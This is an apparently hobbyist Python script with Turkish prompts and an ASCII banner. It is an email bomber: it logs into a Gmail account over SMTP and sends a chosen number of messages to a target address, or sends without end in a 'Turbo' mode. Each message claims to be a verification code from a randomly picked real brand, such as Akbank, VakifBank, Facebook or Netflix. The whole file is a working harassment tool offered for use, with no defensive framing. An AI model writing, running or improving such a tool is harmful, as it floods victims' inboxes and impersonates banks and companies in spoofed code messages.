import smtplib
import random
from colorama import Fore, Style
from os import system
import time

kod = random.randint(100000, 600050)
print(kod)

markalar_list = ["Facebook",
                 "Papara",
                 "VakifBank",
                 "Meta",
                 "BigoLive",
                 "Temu",
                 "Alibaba",
                 "YouTube",
                 "Roblox",
                 "TikTok",
                 "Avansas",
                 "İdefix",
                 "Msn.com",
                 "KuvetTurk",
                 "Akbank",
                 "Pazarama",
                 "Sahibinden",
                 "Boyner",
                 "Netflix",
                 "Exxen",
                 "Turkcell",
                 "Supercell",
                 "Riot Games",
                 "BİM",
                 "ŞOK",
                 "A101",
                 "Trendyol",
                 "N11",
                 "Hepsiburada",
                 "Nokia",
                 "Samsung",
                 "Turna",
                 "FirsatimFirsat",
                 "Happy",
                 "Zara",
                 "Altinyildiz",
                 "Gucci",
                 "Beymen",
                 "Nike",
                 "Adidas",
                 "Kinetix"]

logo = """
     _  __      _  __           __  __ 
    | |/ /_ __ (_)/ _| ___  ___|  \/  |
    | ' /| '_ \| | |_ / _ \/ _ \ |\/| |
    | . \| | | | |  _|  __/  __/ |  | |
    \_|\_\_| |_|_|_|  \___|\___|_|  |_/
             
    {}Port:587             {}by {}@Rootninjaa\n 
""".format(Fore.LIGHTCYAN_EX, Style.RESET_ALL, Fore.LIGHTRED_EX)


def mail_bombasi():
    #marka seçelim:
    marka = random.choice(markalar_list)

    mesaj = f"{marka} için doğrulama kodunuz {kod}"
    mesaj = mesaj.encode('utf-8')

    server = smtplib.SMTP("smtp.gmail.com", '587')
    server.starttls()

    server.login(gönderen,şifresi)

    server.sendmail(gönderen,alici,mesaj)
    print(Fore.GREEN + f"[+]Başarili <--> {marka}")
                
    server.quit()


while 1:
    system("cls||clear")
    time.sleep(2)
    print(Fore.RED + logo)

    try:
        menü = int(input(Fore.LIGHTRED_EX + " 1- Mail Gönder (Normal)\n\n 2- Mail Gönder (Turbo)\n\n 3- Çikiş\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        
        if menü == 1:
            while True:
                system("cls||clear")
                print(Fore.RED + logo)
                
                gönderen = input(Fore.BLUE + "Gönderenin gmail adresi: ")
                if len(gönderen) == 0:
                    print(Fore.RED + "Hatali gmail adresi, tekrar deneyiniz...")
                    time.sleep(2)
                    continue
                break

            şifresi = input(Fore.LIGHTCYAN_EX + "Uygulama şifreniz: ")
            alici = input(Fore.LIGHTCYAN_EX + "Hedef gmail adresi: ")
            adet = int(input(Fore.LIGHTGREEN_EX + "Kaç mail göndermek istersiniz?: "))

            for _ in range(adet):
                mail_bombasi()
                time.sleep(1)


        elif menü == 2:
            gönderen = input(Fore.BLUE + "Gönderenin gmail adresi: ")
            şifresi = input(Fore.LIGHTCYAN_EX + "Uygulama şifreniz: ")
            alici = input(Fore.LIGHTCYAN_EX + "Hedef gmail adresi: ")
            while True:
                mail_bombasi()
            
        elif menü == 3:
            print(Fore.GREEN + "Çıkılıyor...")
            break

        else:
            print(Fore.RED + "Geçersiz seçim! Lütfen tekrar deneyin.")
            time.sleep(2)
            continue
    except ValueError:
        print(Fore.RED + "Lütfen geçerli bir sayı girin!")
        time.sleep(2)
        continue